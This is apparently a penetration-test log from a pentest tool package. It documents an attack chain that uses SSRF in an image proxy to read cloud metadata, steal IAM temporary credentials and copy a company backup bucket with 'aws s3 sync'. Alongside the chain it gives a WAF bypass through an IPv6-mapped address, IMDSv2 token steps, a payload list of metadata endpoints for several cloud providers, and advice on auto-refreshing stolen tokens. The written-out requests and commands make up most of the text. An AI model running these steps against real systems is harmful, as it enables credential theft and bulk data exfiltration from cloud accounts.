# [2026-02] SSRF → Cloud Metadata → AK/SK → OSS Full Data

## Scene Classification
Web Penetration / Cloud Security

## Overview of Goals
Access the cloud metadata service through the SSRF vulnerability in the web application, obtain temporary credentials, and ultimately export all data from the OSS bucket.

## Complete Execution Chain

1. Found that the image proxy interface has SSRF
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (Intranet port probing successful)
   ```
2. Attempt to access cloud metadata
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → Return to metadata directory list
   ```
3. Get IAM Role Name
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Obtain temporary credentials
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Using credentials to enumerate OSS buckets
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Discover sensitive buckets and export data
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Pitfall Record

| Problem | Cause | Solution | Time Consumed |
|------|------|---------|------|
| SSRF Blocked by WAF 169.254 | IP Blacklist | Bypass Using IPv6 Address `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expire in 1 hour | STS Token has a short validity period | Write scripts to automatically refresh the Token | 10min |
| Metadata v2 requires Token | IMDSv2 Protection | First PUT to get Token, then request with Token | 20min |

## Toolchain Discovery
- The metadata paths of Alibaba Cloud and AWS are different and need to be tried separately
- IMDSv2 requires a two-step request (PUT to get token → GET with token)
- Some cloud providers have enabled IMDSv2 by default, making SSRF more difficult

## Key Code/Commands

```bash
# IMDSv2 Bypass (requires SSRF to support custom Method and Header)
# Step 1: Obtain Token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Request with Token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable patterns/script snippets

```bash
# SSRF Cloud Metadata Rapid Detection Payload List
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Suggestions for Improvement of This Package
- routing.md already has SSRF/cloud security routing ✓
- It is recommended to supplement a reference table of metadata paths for each cloud provider in pentest-tools/references

## Evolution Actions
- [ ] Add the cloud metadata path reference table to references

## Environmental Information
- Goal: Alibaba Cloud ECS + OSS
- Web Framework: Spring Boot 2.7
- SSRF Type: Full Reflection (Full SSRF)